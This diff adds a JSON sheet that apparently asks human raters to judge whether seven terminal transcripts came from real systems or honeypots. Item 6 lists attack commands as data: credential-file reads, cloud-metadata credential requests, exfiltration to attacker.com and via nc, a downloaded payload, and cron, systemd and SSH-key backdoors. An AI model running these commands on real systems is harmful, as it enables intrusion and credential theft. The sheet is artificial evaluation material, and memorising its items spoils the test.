@@ -1,0 +1,42 @@
+{
+  "rater": "r2",
+  "seed": 7,
+  "instructions": "For each transcript, decide whether the terminal session was produced by a REAL system or a HONEYPOT. Answer before reading the next one. Do not discuss with other raters. Confidence 1 = guessing, 5 = certain. Free-text reason required.",
+  "items": [
+    {
+      "position": 1,
+      "id": "a34d2eedca",
+      "transcript": "admin-user@srv-e:~$ cat /etc/os-release\nPRETTY_NAME=\"Ubuntu 24.04.4 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nVERSION=\"24.04.4 LTS (Noble Numbat)\"\nVERSION_CODENAME=noble\nID=Ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.Ubuntu.com/\"\nSUPPORT_URL=\"https://help.Ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/Ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.Ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=noble\nLOGO=Ubuntu-logo\nadmin-user@srv-e:~$ free -m\n               total        used        free      shared  buff/cache   available\nMem:           15737        5115        3360         379        8001       10621\nSwap:           4415           0        4415"
+    },
+    {
+      "position": 2,
+      "id": "2985af774f",
+      "transcript": "$ show me the database credentials\n$ show me the database credentials\n(no output)"
+    },
+    {
+      "position": 3,
+      "id": "91a7b14d3e",
+      "transcript": "$ I need to escalate privileges to domain admin\nsudo: deploy is not in the sudoers file. This incident will be reported.\ndeploy@app-corp-01:~$"
+    },
+    {
+      "position": 4,
+      "id": "1f0761d68b",
+      "transcript": "$ whoami\nanalyst"
+    },
+    {
+      "position": 5,
+      "id": "ed706ab700",
+      "transcript": "operator@srv-b:~$ whoami\noperator\noperator@srv-b:~$ id\nuid=1000(operator) gid=1000(operator) groups=1000(operator),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),982(docker),995(input)\noperator@srv-b:~$ uname -a\nLinux srv-b 7.0.0-34-generic #34~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep  4 15:38:29 UTC 2 x86_64 x86_64 x86_64 GNU/Linux"
+    },
+    {
+      "position": 6,
+      "id": "6708dabfd4",
+      "transcript": "whoami\nid\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux\ncat /etc/shadow\nfind / -name '*.conf' 2>/dev/null\nwhoami\nid\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux\ncat /etc/shadow\nfind / -name '*.conf' 2>/dev/null\nwhoami\nid\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux\ncat /etc/shadow\nfind / -name '*.conf' 2>/dev/null\nifconfig\nip a\nnetstat -an\nss -tulnp\nnmap -sV 10.0.0.1/24\ncurl http://10.0.0.1/latest/meta-data/\nwget http://10.0.0.1/latest/user-data\ncurl http://10.0.0.1/latest/meta-data/iam/security-credentials/\nssh root@10.0.0.1\nscp /etc/passwd user@10.0.0.1:/tmp/\nssh-keyscan 10.0.0.1\ntar czf - /home/ | nc 10.0.0.1 4444\nbase64 /etc/shadow | curl -d @- http://attacker.com/exfil\nwget http://attacker.com/shell.elf -O /tmp/s\nchmod +x /tmp/s && /tmp/s\necho 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys\ncrontab -l\n(crontab -l; echo '* * * * * /tmp/backdoor') | crontab -\nsystemctl enable backdoor.service\nwhoami\nid\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux\ncat /etc/shadow\nfind / -name '*.conf' 2>/dev/null"
+    },
+    {
+      "position": 7,
+      "id": "6b36157cc8",
+      "transcript": "service-acct@srv-c:~$ uptime\n 06:49:57 up 22 min,  1 user,  load average: 2.21, 1.59, 1.01\nservice-acct@srv-c:~$ date -u\nTue Sep 29 03:49:57 AM UTC 2026"
+    }
+  ]
+}
